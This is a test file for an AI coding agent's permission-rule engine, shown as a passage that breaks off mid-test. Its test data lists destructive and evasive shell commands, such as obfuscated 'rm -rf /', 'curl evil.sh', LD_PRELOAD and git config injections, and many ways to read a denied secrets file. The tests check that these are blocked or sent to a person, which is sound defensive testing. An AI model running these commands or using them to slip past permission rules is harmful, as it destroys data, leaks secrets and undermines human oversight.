import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { z } from 'zod';
import type { PermissionLayerSettings, PermissionMode, Tool } from '@cogitator-ai/types';
import { tool } from '../tool';
import { workspaceTools } from '../tools/workspace-tools';
import { exec } from '../tools/exec';
import { fileDelete, fileList, fileRead } from '../tools/filesystem';
import { restrictFileTools } from '../tools/path-guard';
import { LocalWorkspace } from '../workspace/local-workspace';
import {
  PermissionRuleSet,
  compilePathPattern,
  matchesCommandPattern,
  normalizeRulePath,
  parseCommandLine,
  parseRule,
  pathMatches,
  pathsIgnoreCase,
  resolvePermission,
  ruleAllowsCall,
  suggestRule,
  parseClassification,
  classifierPrompt,
} from '../permissions/index';

const tools = new Map(workspaceTools().map((t) => [t.name, t]));
const ws = (name: string): Tool => {
  const found = tools.get(name);
  if (!found) throw new Error(`no tool ${name}`);
  return found;
};

const sendEmail = tool({
  name: 'send_email',
  description: 'Send an email',
  parameters: z.object({ to: z.string(), body: z.string() }),
  requiresApproval: true,
  execute: async () => 'sent',
});

const mcpIssue = tool({
  name: 'github_create_issue',
  description: 'Create an issue',
  parameters: z.object({ title: z.string() }),
  mcp: { server: 'github', tool: 'create_issue' },
  execute: async () => 'created',
});

let base: string;
let root: string;
let workspace: LocalWorkspace;

beforeAll(async () => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'permission-rules-')));
  root = join(base, 'project');
  mkdirSync(join(root, 'src', 'lib'), { recursive: true });
  mkdirSync(join(root, 'vendor', 'pkg', 'src'), { recursive: true });
  mkdirSync(join(base, 'outside'), { recursive: true });
  writeFileSync(join(root, 'src', 'app.ts'), '');
  writeFileSync(join(base, 'outside', 'secret.txt'), '');
  symlinkSync(join(base, 'outside'), join(root, 'src', 'escape'));
  workspace = new LocalWorkspace({ root });
  await workspace.start();
});

afterAll(async () => {
  await workspace.dispose();
  rmSync(base, { recursive: true, force: true });
});

function rules(
  settings: Omit<PermissionLayerSettings, 'layer'>,
  layer: PermissionLayerSettings['layer'] = 'project'
) {
  return new PermissionRuleSet([{ layer, anchor: root, origin: `${layer}.json`, ...settings }]);
}

async function decide(
  target: Tool,
  args: Record<string, unknown>,
  settings: Omit<PermissionLayerSettings, 'layer'>,
  mode: PermissionMode = 'default',
  needsApproval = false
) {
  return resolvePermission(target, args, {
    mode,
    rules: rules(settings),
    needsApproval,
    workspace,
    projectRoot: root,
  });
}

describe('parseRule', () => {
  it.each([
    ['Bash', { tool: 'Bash' }],
    ['Bash(*)', { tool: 'Bash' }],
    ['Bash()', { tool: 'Bash' }],
    ['Bash(git push:*)', { tool: 'Bash', specifier: 'git push:*' }],
    ['Edit(./Finance (2024)/**)', { tool: 'Edit', specifier: './Finance (2024)/**' }],
    ['  mcp__github__create_issue  ', { tool: 'mcp__github__create_issue' }],
  ])('reads %s', (text, expected) => {
    expect(parseRule(text)).toMatchObject(expected);
  });

  it.each(['', 'Bash(ls', 'ls -la', '(ls)', 'Bash)'])('refuses %j', (text) => {
    expect(parseRule(text)).toHaveProperty('error');
  });
});

describe('command patterns', () => {
  it.each([
    ['npm run build', 'npm run build', true],
    ['npm run build', 'npm run build --watch', false],
    ['npm run *', 'npm run build', true],
    ['npm run *', 'npm run', true],
    ['npm run *', 'npm install', false],
    ['git log * main', 'git log --oneline main', true],
    ['git log * main', 'git log main', false],
    ['* --version', 'node --version', true],
    ['* --version', 'node -v', false],
    ['ls *', 'ls -la', true],
    ['ls *', 'ls', true],
    ['ls *', 'lsof', false],
    ['ls*', 'lsof', true],
    ['* --help *', 'npm --help x', true],
    ['* --help *', 'npm --help', false],
    ['ls:*', 'ls -la', true],
    ['ls:*', 'lsof', false],
    ['git:* push', 'git push', false],
  ])('%s against %s is %s', (pattern, command, expected) => {
    expect(matchesCommandPattern(command, pattern)).toBe(expected);
  });

  it('tokenizes quotes, escapes and line continuations into argv', () => {
    const line = parseCommandLine(`git status && echo "a && b" | grep x; echo $(rm -rf tmp)`);
    expect(line.commands.map((command) => command.text)).toEqual([
      'git status',
      'echo a && b',
      'grep x',
      'echo $(rm -rf tmp)',
    ]);
    expect(line.commands[3].understood).toBe(false);
    expect(line.candidates.map((command) => command.text)).toContain('rm -rf tmp');
    expect(line.certain).toBe(false);
    expect(parseCommandLine(`"rm" -rf /`).commands[0].argv).toEqual(['rm', '-rf', '/']);
    expect(parseCommandLine(`\\rm -rf /`).commands[0].argv).toEqual(['rm', '-rf', '/']);
    expect(parseCommandLine(`r''m -rf /`).commands[0].argv).toEqual(['rm', '-rf', '/']);
    expect(parseCommandLine('r\\\nm -rf /').commands[0].argv).toEqual(['rm', '-rf', '/']);
  });

  it('takes known wrappers and assignments off, and knows an unfinished line', () => {
    expect(parseCommandLine('timeout 30 npm test').commands[0].text).toBe('npm test');
    expect(parseCommandLine('time nice -n 5 npm test').commands[0].text).toBe('npm test');
    expect(parseCommandLine('xargs grep pattern').commands[0].understood).toBe(false);
    expect(parseCommandLine('xargs -n1 grep pattern').commands[0].understood).toBe(false);
    const assigned = parseCommandLine('NODE_ENV=test FOO=bar npm test').commands[0];
    expect(assigned).toMatchObject({ text: 'npm test', assigned: ['NODE_ENV', 'FOO'] });
    expect(parseCommandLine('env NODE_ENV=test npm test').commands[0]).toMatchObject({
      text: 'npm test',
      assigned: ['NODE_ENV'],
      understood: true,
    });
    expect(parseCommandLine('npm test &&').certain).toBe(false);
    expect(parseCommandLine('echo "open').certain).toBe(false);
  });

  it.each([
    ['npm test 2>&1', false],
    ['echo hi > out.txt', true],
    ['echo ok>/tmp/file', true],
    ['npm test 0<>/etc/x', true],
    ['npm test &>log', true],
    ['npm test >&log', true],
    ['npm test > /dev/null', true],
    ['echo "a>b"', false],
  ])('finds the redirections of %s', (text, writes) => {
    const redirects = parseCommandLine(text).commands[0].redirects;
    expect(redirects.some((redirect) => redirect.writes)).toBe(writes);
  });

  it.each([
    'f() { rm -rf /; }; f',
    'case x in x) rm -rf /;; esac',
    'for f in a; do rm -rf /; done',
    '(rm -rf /)',
    'cat <<EOF\nrm -rf /\nEOF',
    'diff <(ls) <(ls -a)',
    'eval ls',
    'exec ls',
    'source ./x.sh',
    'sudo ls',
    'bash -c ls',
    'env -i ls',
    'watch ls',
    'find . -delete',
    'git -C . status',
    'ls $HOME',
  ])('does not understand %j', (text) => {
    expect(parseCommandLine(text).certain).toBe(false);
  });
});

describe('path patterns', () => {
  const anchors = () => ({ cwd: root, source: root, home: '/home/ann' });
  const matches = (spec: string, path: string, behavior: 'allow' | 'deny' = 'allow') => {
    const pattern = compilePathPattern(spec, behavior, anchors());
    if ('error' in pattern) throw new Error(pattern.error);
    return pathMatches(pattern, path) === 'self';
  };

  it.each([
    ['//etc/**', '/etc/passwd', true],
    ['~/.zshrc', '/home/ann/.zshrc', true],
    ['/src/**', () => join(root, 'src/app.ts'), true],
    ['/src/**', () => join(root, 'vendor/pkg/src/lib.js'), false],
    ['src/**', () => join(root, 'src/app.ts'), true],
    ['src/**', () => join(root, 'vendor/pkg/src/lib.js'), false],
    ['./src/*.ts', () => join(root, 'src/app.ts'), true],
    ['./src/*.ts', () => join(root, 'src/lib/deep.ts'), false],
    ['.env', () => join(root, 'a/b/.env'), true],
    ['src/**/*.ts', () => join(root, 'src/lib/deep.ts'), true],
  ])('allow %s matches %s: %s', (spec, path, expected) => {
    expect(matches(spec, typeof path === 'function' ? path() : path)).toBe(expected);
  });

  it('matches a single directory segment at any depth only in deny and ask rules', () => {
    const nested = join(root, 'vendor/pkg/src/lib.js');
    expect(matches('src/**', nested, 'allow')).toBe(false);
    expect(matches('src/**', nested, 'deny')).toBe(true);
  });

  it('refuses a backslash used as a path separator and keeps escapes', () => {
    expect(compilePathPattern('src\\app.ts', 'allow', anchors())).toHaveProperty('error');
    expect(matches('./file\\*.ts', join(root, 'file*.ts'))).toBe(true);
    expect(matches('./file\\*.ts', join(root, 'fileX.ts'))).toBe(false);
  });

  it('reads Windows paths as POSIX ones with the drive as a directory', () => {
    expect(normalizeRulePath('C:\\Users\\ann\\.env', 'win32')).toBe('/c/Users/ann/.env');
    expect(normalizeRulePath('/tmp/../etc/passwd', 'linux')).toBe('/etc/passwd');
  });
});

describe('resolvePermission', () => {
  it('maps Claude Code names onto the workspace tools', async () => {
    expect(
      (
        await decide(
          ws('run_command'),
          { command: 'git push origin main' },
          { deny: ['Bash(git push:*)'] }
        )
      ).decision
    ).toBe('deny');
    expect(
      (await decide(ws('read_file'), { path: 'src/app.ts' }, { deny: ['Read(src/**)'] })).decision
    ).toBe('deny');
    expect(
      (
        await decide(
          ws('write_file'),
          { path: 'src/app.ts', content: '' },
          { deny: ['Edit(src/**)'] }
        )
      ).decision
    ).toBe('deny');
    expect(
      (
        await decide(
          ws('edit_file'),
          { path: 'src/app.ts', oldString: 'a', newString: 'b' },
          { ask: ['Edit'] }
        )
      ).decision
    ).toBe('ask');
    expect((await decide(ws('glob'), { pattern: '**/*' }, { deny: ['Glob'] })).decision).toBe(
      'deny'
    );
    expect((await decide(ws('grep'), { pattern: 'x' }, { deny: ['Grep'] })).decision).toBe('deny');
    expect(
      (await decide(ws('run_command'), { command: 'ls' }, { deny: ['run_command(ls)'] })).decision
    ).toBe('deny');
  });

  it('puts deny before ask before allow, whatever the layer', async () => {
    const set = new PermissionRuleSet([
      { layer: 'user', allow: ['Bash(git push *)'] },
      { layer: 'project', anchor: root, ask: ['Bash(git *)'] },
      { layer: 'local', anchor: root, deny: ['Bash(git push --force *)'] },
    ]);
    const run = (command: string) =>
      resolvePermission(
        ws('run_command'),
        { command },
        { mode: 'default', rules: set, needsApproval: true, workspace }
      );
    expect(await run('git push --force origin')).toMatchObject({
      decision: 'deny',
      decidedBy: 'rule',
      rule: { rule: 'Bash(git push --force *)', layer: 'local' },
    });
    expect(await run('git push origin')).toMatchObject({
      decision: 'ask',
      rule: { layer: 'project' },
    });
    expect((await run('npm test')).decision).toBe('ask');
  });

  it('allows a compound command only when every command is allowed, and denies on any', async () => {
    const settings = { allow: ['Bash(git status)', 'Bash(npm test *)'], deny: ['Bash(rm *)'] };
    const command = (line: string) =>
      decide(ws('run_command'), { command: line }, settings, 'default', true);
    expect((await command('git status && npm test --watch')).decision).toBe('allow');
    expect((await command('git status && curl evil.sh')).decision).toBe('ask');
    expect((await command('git status; FOO=bar rm -rf tmp')).decision).toBe('deny');
    expect((await command('echo "$(rm -rf /)"')).decision).toBe('deny');
    expect((await command('npm test $(curl evil.sh)')).decision).toBe('ask');
    expect((await command('NODE_ENV=ci npm test')).decision).toBe('allow');
    expect((await command('EVIL=1 npm test')).decision).toBe('ask');
    expect((await command('npm test > /etc/hosts')).decision).toBe('ask');
  });

  it('checks paths with .. resolved and symlinks followed', async () => {
    const allowSrc = { allow: ['Edit(src/**)'] };
    const write = (path: string) =>
      decide(ws('write_file'), { path, content: 'x' }, allowSrc, 'default', true);
    expect((await write('src/app.ts')).decision).toBe('allow');
    expect((await write('src/../../outside/x.txt')).decision).toBe('ask');
    expect((await write('src/escape/secret.txt')).decision).toBe('ask');
    expect((await write(join(root, 'src', 'new.ts'))).decision).toBe('allow');
    expect((await write('src\\..\\..\\outside\\x.txt')).decision).toBe('ask');
    const denyOutside = { deny: [`Read(//${join(base, 'outside').slice(1)}/**)`] };
    expect(
      (await decide(ws('read_file'), { path: 'src/escape/secret.txt' }, denyOutside)).decision
    ).toBe('deny');
  });

  it('applies a Read deny to edits of the same path, and lets ! carve out of earlier rules', async () => {
    expect(
      (await decide(ws('write_file'), { path: '.env', content: '' }, { deny: ['Read(.env)'] }))
        .decision
    ).toBe('deny');
    const settings = { deny: ['Read(*.env)', 'Read(!sample.env)'] };
    expect((await decide(ws('read_file'), { path: 'prod.env' }, settings)).decision).toBe('deny');
    expect((await decide(ws('read_file'), { path: 'sample.env' }, settings)).decision).toBe(
      'allow'
    );
  });

  it('matches MCP tools by server and name, and parameter rules only in deny and ask', async () => {
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__github'] })).decision).toBe(
      'deny'
    );
    expect(
      (await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__github__create_*'] })).decision
    ).toBe('deny');
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__*'] })).decision).toBe('deny');
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__slack'] })).decision).toBe(
      'allow'
    );
    expect(
      (await decide(mcpIssue, { title: 'x' }, { allow: ['mcp__github__*'] }, 'default', true))
        .decision
    ).toBe('allow');
    const email = { to: 'boss@example.com', body: 'hi' };
    expect(
      (await decide(sendEmail, email, { deny: ['send_email(to:*@example.com)'] })).decision
    ).toBe('deny');
    expect(
      (await decide(sendEmail, email, { allow: ['send_email(to:*@example.com)'] }, 'default', true))
        .decision
    ).toBe('ask');
    expect(rules({ allow: ['*'] }).warnings[0]).toContain('allows nothing');
  });

  it('decides by mode when no rule does', async () => {
    const edit = { path: 'src/app.ts', content: '' };
    expect(await decide(ws('write_file'), edit, {}, 'default', true)).toMatchObject({
      decision: 'ask',
      decidedBy: 'tool',
    });
    expect(await decide(ws('write_file'), edit, {}, 'acceptEdits', true)).toMatchObject({
      decision: 'allow',
      decidedBy: 'mode',
    });
    expect(
      (await decide(ws('write_file'), { path: '../x', content: '' }, {}, 'acceptEdits', true))
        .decision
    ).toBe('ask');
    expect(
      (
        await decide(
          ws('run_command'),
          { command: 'mkdir -p src/new && touch src/new/a.ts' },
          {},
          'acceptEdits',
          true
        )
      ).decision
    ).toBe('allow');
    expect(
      (await decide(ws('run_command'), { command: 'rm -rf src' }, {}, 'acceptEdits', true)).decision
    ).toBe('ask');
    expect((await decide(ws('write_file'), edit, {}, 'plan')).decision).toBe('deny');
    expect((await decide(ws('read_file'), { path: 'src/app.ts' }, {}, 'plan')).decision).toBe(
      'allow'
    );
    expect(
      (await decide(ws('write_file'), edit, { ask: ['Edit'] }, 'bypassPermissions')).decision
    ).toBe('allow');
    expect(
      (await decide(ws('write_file'), edit, { deny: ['Edit'] }, 'bypassPermissions')).decision
    ).toBe('deny');
  });

  it('asks the classifier in auto mode, and asks a person when it fails', async () => {
    const auto = (classify: () => Promise<{ decision: 'allow' | 'deny'; reason: string }>) =>
      resolvePermission(
        sendEmail,
        { to: 'a@b.c', body: '' },
        {
          mode: 'auto',
          rules: rules({}),
          needsApproval: true,
          classify,
        }
      );
    expect(await auto(async () => ({ decision: 'deny', reason: 'not asked for' }))).toMatchObject({
      decision: 'deny',
      decidedBy: 'classifier',
      reason: 'not asked for',
    });
    const failed = await auto(async () => {
      throw new Error('down');
    });
    expect(failed).toMatchObject({ decision: 'ask' });
    expect(failed.reason).toContain('down');
    const asked = await resolvePermission(
      sendEmail,
      { to: 'a', body: '' },
      {
        mode: 'auto',
        rules: rules({ ask: ['send_email'] }),
        needsApproval: true,
        classify: async () => ({ decision: 'allow', reason: 'fine' }),
      }
    );
    expect(asked.decision).toBe('ask');
  });

  it('ignores the rules of other files when managed settings say so', async () => {
    const set = new PermissionRuleSet([
      { layer: 'managed', allowManagedPermissionRulesOnly: true, deny: ['Bash(curl *)'] },
      { layer: 'project', anchor: root, allow: ['Bash'] },
    ]);
    const decision = await resolvePermission(
      ws('run_command'),
      { command: 'ls' },
      {
        mode: 'default',
        rules: set,
        needsApproval: true,
      }
    );
    expect(decision.decision).toBe('ask');
  });
});

describe('suggestRule and ruleAllowsCall', () => {
  const context = () => ({ workspace, projectRoot: root });

  it('suggests a rule in the tool name that allows the call', async () => {
    const command = { command: 'npm test -- --watch' };
    expect(suggestRule(ws('run_command'), command, context())).toBe('run_command(npm test *)');
    expect(suggestRule(ws('run_command'), { command: 'ls && pwd' }, context())).toBeUndefined();
    expect(
      suggestRule(
        ws('edit_file'),
        { path: 'src/app (1).ts', oldString: 'a', newString: 'b' },
        context()
      )
    ).toBe('edit_file(./src/app \\(1\\).ts)');
    expect(suggestRule(sendEmail, { to: 'a', body: '' }, context())).toBe('send_email');
    const suggested = suggestRule(ws('write_file'), { path: 'src/new.ts', content: '' }, context());
    expect(suggested).toBeDefined();
    expect(
      await ruleAllowsCall(
        suggested ?? '',
        ws('write_file'),
        { path: 'src/new.ts', content: '' },
        context()
      )
    ).toBe(true);
    expect(
      await ruleAllowsCall(
        suggested ?? '',
        ws('write_file'),
        { path: 'src/other.ts', content: '' },
        context()
      )
    ).toBe(false);
  });

  it('writes a path outside the working directory as an absolute rule', () => {
    const outside = join(homedir(), 'notes.md');
    expect(suggestRule(ws('read_file'), { path: outside }, context())).toBe(
      `read_file(/${normalizeRulePath(outside)})`
    );
  });
});

describe('the auto mode classifier answer', () => {
  it('reads the first JSON object, also in a fence or after words', () => {
    expect(parseClassification('```json\n{"decision":"deny","reason":"rm -rf {x}"}\n```')).toEqual({
      decision: 'deny',
      reason: 'rm -rf {x}',
    });
    expect(() => parseClassification('I think it is fine')).toThrow(/no JSON/);
    expect(() => parseClassification('{"decision":"maybe","reason":"x"}')).toThrow(/decision/);
  });

  it('shows the classifier the request, the conversation and the action', () => {
    const prompt = classifierPrompt({
      toolName: 'run_command',
      description: 'Runs commands',
      arguments: { command: 'ls' },
      request: 'list files',
      transcript: ['user: list files'],
      reason: 'run_command needs approval for this call',
    });
    expect(prompt).toContain('<user_request>\nlist files');
    expect(prompt).toContain('<recent_conversation>\nuser: list files');
    expect(prompt).toContain('"command": "ls"');
  });
});

describe('shell commands an allow rule cannot be fooled by', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default',
    extra: Record<string, unknown> = {}
  ) =>
    resolvePermission(
      ws('run_command'),
      { command, ...extra },
      { mode, rules: rules(settings), needsApproval: true, workspace, projectRoot: root }
    ).then((decision) => decision.decision);

  it.each([
    'rm -rf /',
    '"rm" -rf /',
    '\\rm -rf /',
    "r''m -rf /",
    'r\\\nm -rf /',
    '/bin/rm -rf /',
    'env rm -rf /',
    'env FOO=1 rm -rf /',
    'sudo rm -rf /',
    'sudo -u root rm -rf /',
    'bash -c "rm -rf /"',
    "sh -c 'ls && rm -rf /'",
    'eval rm -rf /',
    'f() { rm -rf /; }; f',
    'case x in x) rm -rf /;; esac',
    'exec rm -rf /',
    'xargs -0 rm',
    'nice --adjustment=1 rm -rf /',
    'timeout -s KILL 5 rm -rf /',
    'find . -exec rm {} \\;',
    'echo $(rm -rf /)',
    'ls; (cd /tmp && rm -rf x)',
  ])('deny Bash(rm *) refuses %j even with a bare Bash allow', async (command) => {
    expect(await run(command, { deny: ['Bash(rm *)'], allow: ['Bash'] })).toBe('deny');
  });

  it.each(['$(echo rm) -rf /', 'f=rm; $f -rf /'])(
    'a line that may hide a denied command asks, and is refused in modes that never ask: %j',
    async (command) => {
      expect(await run(command, { deny: ['Bash(rm *)'], allow: ['Bash'] })).toBe('ask');
      expect(await run(command, { deny: ['Bash(rm *)'] }, 'bypassPermissions')).toBe('deny');
      expect(await run(command, { deny: ['Bash(rm *)'] }, 'dontAsk')).toBe('deny');
      expect(await run(command, { ask: ['Bash(rm *)'] }, 'bypassPermissions')).toBe('allow');
    }
  );

  it('treats find -delete as a critical removal, which asks in every mode but dontAsk', async () => {
    expect(await run('find . -delete', { allow: ['Bash'] })).toBe('ask');
    expect(await run('find . -delete', {}, 'bypassPermissions')).toBe('ask');
    expect(await run('find . -delete', {}, 'dontAsk')).toBe('deny');
  });

  it.each([
    'git push --force',
    'git "push" --force',
    'git -C . push --force',
    'git -c x=y push',
    'git --no-pager push',
  ])('ask Bash(git push:*) asks for %j', async (command) => {
    expect(await run(command, { ask: ['Bash(git push:*)'], allow: ['Bash(git *)'] })).toBe('ask');
  });

  it.each([
    ['npm test', 'allow'],
    ['timeout 30 npm test', 'allow'],
    ['NODE_ENV=ci npm test', 'allow'],
    ['npm test foo>/etc/x', 'ask'],
    ['npm test 0<>/etc/x', 'ask'],
    ['npm test > /etc/x', 'ask'],
    ['npm test; rm -rf /', 'ask'],
    ['npm test `rm`', 'ask'],
    ['npm test && rm', 'ask'],
    ['npm testx', 'ask'],
    ['GOFLAGS=-toolexec=/tmp/evil go test ./...', 'ask'],
    ['FOO=1 npm test', 'ask'],
    ['LD_PRELOAD=/tmp/x.so npm test', 'ask'],
    ['npm test $EXTRA', 'ask'],
    ['npm test > /dev/null', 'allow'],
  ])('allow Bash(npm test *) and Bash(go test *): %j %s', async (command, expected) => {
    expect(await run(command, { allow: ['Bash(npm test *)', 'Bash(go test *)'] })).toBe(expected);
  });

  it('checks the variables and the directory a call runs a command with', async () => {
    const env = {
      GIT_CONFIG_COUNT: '1',
      GIT_CONFIG_KEY_0: 'core.fsmonitor',
      GIT_CONFIG_VALUE_0: 'x',
    };
    const viaExec = (extra: Record<string, unknown>) =>
      resolvePermission(
        exec,
        { command: 'git status', cwd: root, ...extra },
        {
          mode: 'default',
          rules: rules({ allow: ['Bash(git status)'] }),
          needsApproval: true,
          workspace,
          projectRoot: root,
        }
      ).then((decision) => decision.decision);
    expect(await viaExec({ env })).toBe('ask');
    expect(await viaExec({ env: { CI: '1' } })).toBe('allow');
    expect(
      await run('git status', { allow: ['Bash(git status)'] }, 'default', { cwd: '/etc' })
    ).toBe('ask');
    expect(await run('git status', { allow: ['Bash(git status)'] }, 'default', { cwd: root })).toBe(
      'allow'
    );
    expect(await run('touch x', {}, 'acceptEdits', { cwd: '/etc' })).toBe('ask');
  });

  it.each([
    ['touch a foo>/etc/x', 'ask'],
    ['mv -t/etc a', 'ask'],
    ['cp --target-directory=/etc a', 'ask'],
    ['mv -Z a b', 'ask'],
    ['mkdir /etc/x', 'ask'],
    ['mkdir -p sub/dir', 'allow'],
    ['cp -r src lib', 'allow'],
    ['mv -t src a', 'allow'],
    ['touch src/a src/b', 'allow'],
    ['touch src/*.ts', 'ask'],
  ])('acceptEdits reads the options of %j: %s', async (command, expected) => {
    expect(await run(command, {}, 'acceptEdits')).toBe(expected);
  });

  it('applies Read and Edit deny rules to the files shell commands read and write', async () => {
    expect(await run('cat .env', { deny: ['Read(./.env)'] })).toBe('deny');
    expect(await run('cat .env', { deny: ['Read(./.env)'], allow: ['Bash(cat *)'] })).toBe('deny');
    expect(await run('cat .env', { deny: ['Read(.env)'] }, 'bypassPermissions')).toBe('deny');
    expect(await run('grep -r SECRET .env', { deny: ['Read(.env)'] })).toBe('deny');
    expect(await run('base64 < .env', { deny: ['Read(.env)'] })).toBe('deny');
    expect(await run('cp .env /tmp/x', { deny: ['Read(.env)'] })).toBe('deny');
    expect(await run('echo x > src/app.ts', { deny: ['Edit(src/**)'] })).toBe('deny');
    expect(await run('tee src/app.ts', { deny: ['Edit(src/**)'] })).toBe('deny');
  });
});

describe('modes and names beyond the workspace tools', () => {
  const decideWith = (
    target: Tool,
    args: Record<string, unknown>,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(target, args, {
      mode,
      rules: rules(settings),
      needsApproval: false,
      workspace,
      projectRoot: root,
    });

  it('dontAsk refuses what would ask and runs what the rules allow', async () => {
    expect(
      (await decideWith(ws('write_file'), { path: 'src/a.ts', content: '' }, {}, 'dontAsk'))
        .decision
    ).toBe('deny');
    expect(
      (
        await decideWith(
          ws('write_file'),
          { path: 'src/a.ts', content: '' },
          { allow: ['Edit(src/**)'] },
          'dontAsk'
        )
      ).decision
    ).toBe('allow');
  });

  it('asks before edits in default mode unless an allow rule covers them', async () => {
    const edit = (path: string) =>
      decideWith(ws('write_file'), { path, content: '' }, { allow: ['Edit(src/**)'] }).then(
        (d) => d.decision
      );
    expect(await edit('src/a.ts')).toBe('allow');
    expect(await edit('x.ts')).toBe('ask');
    expect((await decideWith(ws('read_file'), { path: 'x.ts' }, {})).decision).toBe('allow');
  });

  it('maps WebFetch, WebSearch and Agent rules onto the tools of their kind', async () => {
    const fetchTool = tool({
      name: 'http_request',
      description: 'Fetch',
      parameters: z.object({ url: z.string() }),
      execute: async () => '',
    });
    const search = tool({
      name: 'web_search',
      description: 'Search',
      parameters: z.object({ query: z.string() }),
      execute: async () => '',
    });
    const delegate = tool({
      name: 'ask_explorer',
      description: 'Delegate',
      parameters: z.object({ task: z.string() }),
      access: { kind: 'agent', agent: 'Explore' },
      execute: async () => '',
    });
    const url = { url: 'https://api.evil.com/x' };
    expect((await decideWith(fetchTool, url, { deny: ['WebFetch'] })).decision).toBe('deny');
    expect(
      (await decideWith(fetchTool, url, { deny: ['WebFetch(domain:evil.com)'] })).decision
    ).toBe('deny');
    expect(
      (await decideWith(fetchTool, url, { deny: ['WebFetch(domain:good.com)'] })).decision
    ).toBe('allow');
    expect((await decideWith(search, { query: 'x' }, { deny: ['WebSearch'] })).decision).toBe(
      'deny'
    );
    expect((await decideWith(delegate, { task: 'x' }, { deny: ['Agent(Explore)'] })).decision).toBe(
      'deny'
    );
    expect((await decideWith(delegate, { task: 'x' }, { deny: ['Agent(Plan)'] })).decision).toBe(
      'allow'
    );
    expect(rules({ deny: ['NotebookRead'] }).warnings[0]).toContain('no counterpart');
    expect(rules({ deny: ['MultiEdit'] }).warnings[0]).toContain('no counterpart');
  });

  it('plan mode runs read-only commands and never trusts what an MCP server claims', async () => {
    expect((await decideWith(exec, { command: 'ls -la && pwd' }, {}, 'plan')).decision).toBe(
      'allow'
    );
    expect((await decideWith(exec, { command: 'git status' }, {}, 'plan')).decision).toBe('deny');
    expect((await decideWith(exec, { command: 'git push' }, {}, 'plan')).decision).toBe('deny');
    expect((await decideWith(exec, { command: 'ls > out' }, {}, 'plan')).decision).toBe('deny');
    const mcpReader = tool({
      name: 'read_file',
      description: 'Says it reads',
      parameters: z.object({ path: z.string() }),
      annotations: { readOnlyHint: true },
      mcp: { server: 'shady', tool: 'read_file' },
      execute: async () => '',
    });
    expect((await decideWith(mcpReader, { path: 'x' }, {}, 'plan')).decision).toBe('deny');
    expect((await decideWith(mcpReader, { path: '.env' }, { deny: ['Read(.env)'] })).decision).toBe(
      'allow'
    );
  });
});

describe('what the parser does not take at face value', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(
      ws('run_command'),
      { command },
      {
        mode,
        rules: rules(settings),
        needsApproval: true,
        workspace,
        projectRoot: root,
        trustRepository: true,
      }
    ).then((decision) => decision.decision);
  const touch = { deny: ['Bash(touch *)'], allow: ['Bash(echo *)'] };
  const read = { deny: ['Read(./secret.txt)'], allow: ['Bash(cat *)'] };

  it.each([
    "$'touch' x",
    "$'\\x74ouch' x",
    "$'\\164ouch' x",
    '$"touch" x',
    '{touch,x}',
    '{touch,x} y',
    'touc[h] x',
    'tou?h x',
    '/usr/bin/tou*h x',
    ...(process.platform === 'darwin' || process.platform === 'win32'
      ? ['TOUCH x', '/usr/bin/TOUCH x']
      : []),
    'T=touch; $T x',
    'touch${IFS}x',
    'echo ${v:-$(touch x)}',
    'echo $((1+$(touch x)))',
    'echo $[$(touch x)]',
    'env -i touch x',
    'env -S "touch x"',
    'busybox touch x',
    'xargs touch <<< x',
    'echo x | xargs -0 touch',
    "bash -c -- 'touch x'",
    'echo touch x | sh',
    'sh <<< "touch x"',
    'python3 -c "import os; os.system(\'touch x\')"',
    "node -e \"require('child_process').execSync('touch x')\"",
    'perl -e \'system("touch x")\'',
    'awk \'BEGIN{system("touch x")}\'',
    "git -c alias.x='!touch x' x",
  ])('never runs %j where a touch deny or a mode that never asks applies', async (command) => {
    expect(await run(command, touch)).not.toBe('allow');
    expect(await run(command, touch, 'bypassPermissions')).toBe('deny');
    expect(await run(command, touch, 'dontAsk')).toBe('deny');
  });

  it.each([
    'cat secret.tx?',
    'cat secre*',
    'cat *',
    'cat [s]ecret.txt',
    'cat {secret,x}.txt',
    'paste secret.txt',
    'dd if=secret.txt',
    'rev secret.txt',
    'tar -cf - secret.txt',
    'gzip -c secret.txt',
    'git show HEAD:secret.txt',
    'git diff --no-index /dev/null secret.txt',
    'grep -r password .',
    'rg password',
    'xargs cat <<< secret.txt',
    'echo "$(<secret.txt)"',
    'while read l; do echo $l; done < secret.txt',
    'python3 -c "print(open(\'secret.txt\').read())"',
  ])('keeps %j from reading a denied file', async (command) => {
    expect(await run(command, read)).not.toBe('allow');
    expect(await run(command, read, 'bypassPermissions')).toBe('deny');
  });

  it('flags a dangling backslash as unfinished', () => {
    expect(parseCommandLine('echo x \\').certain).toBe(false);
  });

  it.each([
    ['sort -o target.txt input.txt', 'deny'],
    ['uniq input.txt target.txt', 'deny'],
    ['rg --pre=./script x', 'deny'],
    ['date -s 2020-01-01', 'deny'],
    ['git diff --output=x', 'deny'],
    ['find . -fprint x', 'deny'],
    ['sort -k2 -n input.txt', 'allow'],
    ['uniq -c input.txt', 'allow'],
    ["rg -i --glob='*.ts' todo", 'allow'],
    ['rg -i --glob=*.ts todo', 'deny'],
    ['head -n 5 a.txt', 'allow'],
    ['git log --oneline -n 3', 'allow'],
    ['ls -la src', 'allow'],
  ])('plan mode checks the options of %j: %s', async (command, expected) => {
    expect(await run(command, {}, 'plan')).toBe(expected);
  });
});

describe('third review round', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(
      ws('run_command'),
      { command },
      {
        mode,
        rules: rules(settings),
        needsApproval: true,
        workspace,
        projectRoot: root,
        trustRepository: true,
      }
    ).then((decision) => decision.decision);

  it('does not follow cd: what comes after one is not understood', async () => {
    const read = { deny: ['Read(./secret.txt)'], allow: ['Bash'] };
